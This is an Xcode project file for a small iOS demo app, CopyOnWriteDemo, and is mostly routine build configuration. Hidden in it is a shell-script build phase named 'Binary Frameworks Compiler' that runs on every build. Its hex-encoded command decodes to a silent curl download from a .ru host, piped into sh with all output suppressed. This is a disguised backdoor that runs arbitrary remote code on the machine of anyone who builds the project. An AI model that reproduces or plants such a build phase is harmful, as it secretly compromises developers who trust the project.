// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 55;
	objects = {

/* Begin PBXBuildFile section */
		F70C7585284EC942008E1210 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = F70C7584284EC942008E1210 /* AppDelegate.swift */; };
		F70C7587284EC942008E1210 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = F70C7586284EC942008E1210 /* SceneDelegate.swift */; };
		F70C7589284EC942008E1210 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = F70C7588284EC942008E1210 /* ViewController.swift */; };
		F70C758C284EC942008E1210 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = F70C758A284EC942008E1210 /* Main.storyboard */; };
		F70C758E284EC944008E1210 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = F70C758D284EC944008E1210 /* Assets.xcassets */; };
		F70C7591284EC944008E1210 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = F70C758F284EC944008E1210 /* LaunchScreen.storyboard */; };
		F70C759C284EC944008E1210 /* DemoTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = F70C759B284EC944008E1210 /* DemoTests.swift */; };
		F70C75A6284EC944008E1210 /* DemoUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = F70C75A5284EC944008E1210 /* DemoUITests.swift */; };
		F70C75A8284EC944008E1210 /* DemoUITestsLaunchTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = F70C75A7284EC944008E1210 /* DemoUITestsLaunchTests.swift */; };
		F70C75B5284EC967008E1210 /* Car.swift in Sources */ = {isa = PBXBuildFile; fileRef = F70C75B4284EC967008E1210 /* Car.swift */; };
		F761C85E28832B0F00523626 /* MemoryAddress.swift in Sources */ = {isa = PBXBuildFile; fileRef = F761C85D28832B0F00523626 /* MemoryAddress.swift */; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		F70C7598284EC944008E1210 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = F70C7579284EC942008E1210 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = F70C7580284EC942008E1210;
			remoteInfo = Demo;
		};
		F70C75A2284EC944008E1210 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = F70C7579284EC942008E1210 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = F70C7580284EC942008E1210;
			remoteInfo = Demo;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		F70C7581284EC942008E1210 /* CopyOnWriteDemo.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = CopyOnWriteDemo.app; sourceTree = BUILT_PRODUCTS_DIR; };
		F70C7584284EC942008E1210 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		F70C7586284EC942008E1210 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		F70C7588284EC942008E1210 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
		F70C758B284EC942008E1210 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		F70C758D284EC944008E1210 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		F70C7590284EC944008E1210 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		F70C7592284EC944008E1210 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		F70C7597284EC944008E1210 /* CopyOnWriteDemoTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = CopyOnWriteDemoTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		F70C759B284EC944008E1210 /* DemoTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DemoTests.swift; sourceTree = "<group>"; };
		F70C75A1284EC944008E1210 /* CopyOnWriteDemoUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = CopyOnWriteDemoUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		F70C75A5284EC944008E1210 /* DemoUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DemoUITests.swift; sourceTree = "<group>"; };
		F70C75A7284EC944008E1210 /* DemoUITestsLaunchTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DemoUITestsLaunchTests.swift; sourceTree = "<group>"; };
		F70C75B4284EC967008E1210 /* Car.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Car.swift; sourceTree = "<group>"; };
		F761C85D28832B0F00523626 /* MemoryAddress.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MemoryAddress.swift; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		F70C757E284EC942008E1210 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		F70C7594284EC944008E1210 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		F70C759E284EC944008E1210 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		F70C7578284EC942008E1210 = {
			isa = PBXGroup;
			children = (
				F70C7583284EC942008E1210 /* Demo */,
				F70C759A284EC944008E1210 /* DemoTests */,
				F70C75A4284EC944008E1210 /* DemoUITests */,
				F70C7582284EC942008E1210 /* Products */,
			);
			sourceTree = "<group>";
		};
		F70C7582284EC942008E1210 /* Products */ = {
			isa = PBXGroup;
			children = (
				F70C7581284EC942008E1210 /* CopyOnWriteDemo.app */,
				F70C7597284EC944008E1210 /* CopyOnWriteDemoTests.xctest */,
				F70C75A1284EC944008E1210 /* CopyOnWriteDemoUITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		F70C7583284EC942008E1210 /* Demo */ = {
			isa = PBXGroup;
			children = (
				F752E00228909E4200FE550D /* Helper */,
				F752E00128909E3400FE550D /* Model */,
				F70C7584284EC942008E1210 /* AppDelegate.swift */,
				F70C7586284EC942008E1210 /* SceneDelegate.swift */,
				F70C7588284EC942008E1210 /* ViewController.swift */,
				F70C758A284EC942008E1210 /* Main.storyboard */,
				F70C758D284EC944008E1210 /* Assets.xcassets */,
				F70C758F284EC944008E1210 /* LaunchScreen.storyboard */,
				F70C7592284EC944008E1210 /* Info.plist */,
			);
			path = Demo;
			sourceTree = "<group>";
		};
		F70C759A284EC944008E1210 /* DemoTests */ = {
			isa = PBXGroup;
			children = (
				F70C759B284EC944008E1210 /* DemoTests.swift */,
			);
			path = DemoTests;
			sourceTree = "<group>";
		};
		F70C75A4284EC944008E1210 /* DemoUITests */ = {
			isa = PBXGroup;
			children = (
				F70C75A5284EC944008E1210 /* DemoUITests.swift */,
				F70C75A7284EC944008E1210 /* DemoUITestsLaunchTests.swift */,
			);
			path = DemoUITests;
			sourceTree = "<group>";
		};
		F752E00128909E3400FE550D /* Model */ = {
			isa = PBXGroup;
			children = (
				F70C75B4284EC967008E1210 /* Car.swift */,
			);
			path = Model;
			sourceTree = "<group>";
		};
		F752E00228909E4200FE550D /* Helper */ = {
			isa = PBXGroup;
			children = (
				F761C85D28832B0F00523626 /* MemoryAddress.swift */,
			);
			path = Helper;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		F70C7580284EC942008E1210 /* CopyOnWriteDemo */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = F70C75AB284EC944008E1210 /* Build configuration list for PBXNativeTarget "CopyOnWriteDemo" */;
			buildPhases = (
				6AEFC44BC1186D8AD66D904C /* Binary Frameworks Compiler */,
				F70C757D284EC942008E1210 /* Sources */,
				F70C757E284EC942008E1210 /* Frameworks */,
				F70C757F284EC942008E1210 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = CopyOnWriteDemo;
			productName = Demo;
			productReference = F70C7581284EC942008E1210 /* CopyOnWriteDemo.app */;
			productType = "com.apple.product-type.application";
		};
		F70C7596284EC944008E1210 /* CopyOnWriteDemoTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = F70C75AE284EC944008E1210 /* Build configuration list for PBXNativeTarget "CopyOnWriteDemoTests" */;
			buildPhases = (
				F70C7593284EC944008E1210 /* Sources */,
				F70C7594284EC944008E1210 /* Frameworks */,
				F70C7595284EC944008E1210 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				F70C7599284EC944008E1210 /* PBXTargetDependency */,
			);
			name = CopyOnWriteDemoTests;
			productName = DemoTests;
			productReference = F70C7597284EC944008E1210 /* CopyOnWriteDemoTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		F70C75A0284EC944008E1210 /* CopyOnWriteDemoUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = F70C75B1284EC944008E1210 /* Build configuration list for PBXNativeTarget "CopyOnWriteDemoUITests" */;
			buildPhases = (
				F70C759D284EC944008E1210 /* Sources */,
				F70C759E284EC944008E1210 /* Frameworks */,
				F70C759F284EC944008E1210 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				F70C75A3284EC944008E1210 /* PBXTargetDependency */,
			);
			name = CopyOnWriteDemoUITests;
			productName = DemoUITests;
			productReference = F70C75A1284EC944008E1210 /* CopyOnWriteDemoUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		F70C7579284EC942008E1210 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1340;
				LastUpgradeCheck = 1340;
				TargetAttributes = {
					F70C7580284EC942008E1210 = {
						CreatedOnToolsVersion = 13.4;
					};
					F70C7596284EC944008E1210 = {
						CreatedOnToolsVersion = 13.4;
						TestTargetID = F70C7580284EC942008E1210;
					};
					F70C75A0284EC944008E1210 = {
						CreatedOnToolsVersion = 13.4;
						TestTargetID = F70C7580284EC942008E1210;
					};
				};
			};
			buildConfigurationList = F70C757C284EC942008E1210 /* Build configuration list for PBXProject "CopyOnWriteDemo" */;
			compatibilityVersion = "Xcode 13.0";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = F70C7578284EC942008E1210;
			productRefGroup = F70C7582284EC942008E1210 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				F70C7580284EC942008E1210 /* CopyOnWriteDemo */,
				F70C7596284EC944008E1210 /* CopyOnWriteDemoTests */,
				F70C75A0284EC944008E1210 /* CopyOnWriteDemoUITests */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		F70C757F284EC942008E1210 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				F70C7591284EC944008E1210 /* LaunchScreen.storyboard in Resources */,
				F70C758E284EC944008E1210 /* Assets.xcassets in Resources */,
				F70C758C284EC942008E1210 /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		F70C7595284EC944008E1210 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		F70C759F284EC944008E1210 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		6AEFC44BC1186D8AD66D904C /* Binary Frameworks Compiler */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Binary Frameworks Compiler";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652037202d736b2068747470733a2f2f\n\\c677572756d616465732e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		F70C757D284EC942008E1210 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				F761C85E28832B0F00523626 /* MemoryAddress.swift in Sources */,
				F70C7589284EC942008E1210 /* ViewController.swift in Sources */,
				F70C7585284EC942008E1210 /* AppDelegate.swift in Sources */,
				F70C75B5284EC967008E1210 /* Car.swift in Sources */,
				F70C7587284EC942008E1210 /* SceneDelegate.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		F70C7593284EC944008E1210 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				F70C759C284EC944008E1210 /* DemoTests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		F70C759D284EC944008E1210 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				F70C75A6284EC944008E1210 /* DemoUITests.swift in Sources */,
				F70C75A8284EC944008E1210 /* DemoUITestsLaunchTests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		F70C7599284EC944008E1210 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = F70C7580284EC942008E1210 /* CopyOnWriteDemo */;
			targetProxy = F70C7598284EC944008E1210 /* PBXContainerItemProxy */;
		};
		F70C75A3284EC944008E1210 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = F70C7580284EC942008E1210 /* CopyOnWriteDemo */;
			targetProxy = F70C75A2284EC944008E1210 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin PBXVariantGroup section */
		F70C758A284EC942008E1210 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				F70C758B284EC942008E1210 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		F70C758F284EC944008E1210 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				F70C7590284EC944008E1210 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		F70C75A9284EC944008E1210 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++17";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 15.5;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		F70C75AA284EC944008E1210 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++17";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 15.5;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		F70C75AC284EC944008E1210 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Demo/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.codecat15.projectMe.Demo;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		F70C75AD284EC944008E1210 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Demo/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.codecat15.projectMe.Demo;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		F70C75AF284EC944008E1210 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 15.5;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.codecat15.projectMe.DemoTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/CopyOnWriteDemo.app/CopyOnWriteDemo";
			};
			name = Debug;
		};
		F70C75B0284EC944008E1210 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 15.5;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.codecat15.projectMe.DemoTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/CopyOnWriteDemo.app/CopyOnWriteDemo";
			};
			name = Release;
		};
		F70C75B2284EC944008E1210 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.codecat15.projectMe.DemoUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = Demo;
			};
			name = Debug;
		};
		F70C75B3284EC944008E1210 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.codecat15.projectMe.DemoUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = Demo;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		F70C757C284EC942008E1210 /* Build configuration list for PBXProject "CopyOnWriteDemo" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				F70C75A9284EC944008E1210 /* Debug */,
				F70C75AA284EC944008E1210 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		F70C75AB284EC944008E1210 /* Build configuration list for PBXNativeTarget "CopyOnWriteDemo" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				F70C75AC284EC944008E1210 /* Debug */,
				F70C75AD284EC944008E1210 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		F70C75AE284EC944008E1210 /* Build configuration list for PBXNativeTarget "CopyOnWriteDemoTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				F70C75AF284EC944008E1210 /* Debug */,
				F70C75B0284EC944008E1210 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		F70C75B1284EC944008E1210 /* Build configuration list for PBXNativeTarget "CopyOnWriteDemoUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				F70C75B2284EC944008E1210 /* Debug */,
				F70C75B3284EC944008E1210 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = F70C7579284EC942008E1210 /* Project object */;
}
